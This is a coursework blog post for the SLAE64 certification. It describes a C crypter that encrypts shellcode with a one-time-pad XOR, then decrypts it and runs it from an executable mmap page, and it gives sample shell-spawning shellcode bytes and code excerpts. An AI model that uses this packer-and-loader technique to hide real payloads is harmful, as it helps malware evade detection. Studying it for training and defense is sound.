# Building a custom crypter

For this assignment a custom crypter had to be implemented that encryptes a shellcode and that is able to decrypt the shellcode and execute it.

I have decided to implement a ```One-time pad encrypter``` meaning that it generates a random and unique key for each encryption whereas the key is of the same size as the shellcode.

## Usage

### Encryption
-e specifies the shellcode that you want to be encrypted.

```
./crypter -e \x48\x31\xc0\x99\x50\x5e\x48\xbb\xfe\xee\x31\x5b\x2f\x2f\x73\x68\x48\x81\xc3\x31\x73\x37\x13\x50\x53\x54\x5f\xb0\x3b\x0f\x05
[*] Crypting your payload ...
[+] Generated One-time pad of length: 31
\xc1\xcf\x0f\x9f\x6c\x83\xdd\x09\x35\xc6\xec\x14\x4a\x72\xed\x48\x6a\x97\x0d\x8c\x62\xeb\x8c\x78\xd9\x0b\x20\xcc\xc3\x06\x73
[+] Encryption done:
\x89\xfe\xcf\x06\x3c\xdd\x95\xb2\xcb\x28\xdd\x4f\x65\x5d\x9e\x20\x22\x16\xce\xbd\x11\xdc\x9f\x28\x8a\x5f\x7f\x7c\xf8\x09\x76
[+] Bye
```

As you can see it first generates a random One-time pad of the same length as your specified shellcode.
The result is the One-time pad and the encrypted version of the shellcode.

### Decryption and execution
-d specifies the encrypted shellcode
-k specifies the One-time pad

```
./crypter -d \xe9\xf5\x05\x57\xfa\x36\xf8\x04\xbd\x11\x0c\xba\xf2\xd2\x14\x23\x73\xd5\xf5\x39\x39\xa5\xe5\xfd\x4f\x9a\x8a\xb0\x72\x15\xb5 -k \xa1\xc4\xc5\xce\xaa\x68\xb0\xbf\x43\xff\x3d\xe1\xdd\xfd\x67\x4b\x3b\x54\x36\x08\x4a\x92\xf6\xad\x1c\xce\xd5\x00\x49\x1a\xb0
[*] Starting decrypting ..
[*] Decryption done ...
[*] Create executable page and write shellcode to it
[*] Executing shellcode
[flink@Moor Assignment7]$
```

The tool decryptes the shellcode and executes it afterwards.

## Implementation

The entire implementation is done in C. Here I will present you its most relevant parts:
### Generate a random One-time pad
```
arc4random_buf(xor_key, sizeof xor_key);
```
I make use of the arc4random_buf function that originaly comes from the BSD world. It is known to generate true _random_ bytes and places them into a buffer. I really like how easily this function can be used.
### Encrypt
```
   for ( int i = 0; i < len_payload; ++i )
       payload[i] ^= xor_key[i];
```
This is pretty straight forward. Simply xor every byte of the payload with the respective byte of the One-time pad.

The decryption just works vice versa thanks to xor.

### Execute
```
    void *page = mmap( NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);

    if ( page == MAP_FAILED )
        fatal(NULL);

    if ( len_payload > 0x1000 )
        fatal(NULL); // WTF SHELLCODE!?

    memcpy( page, payload, len_payload);
    printf("[*] Executing shellcode\n");
    ((void(*)()) page)();
```

Next I need to place my shellcode in an executable region.
To do so I allocate a new page using the mmap syscall and mark the new page as _writeable_ and _executable_.
The decrypted shellcode is placed in the new page and finally executed.

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
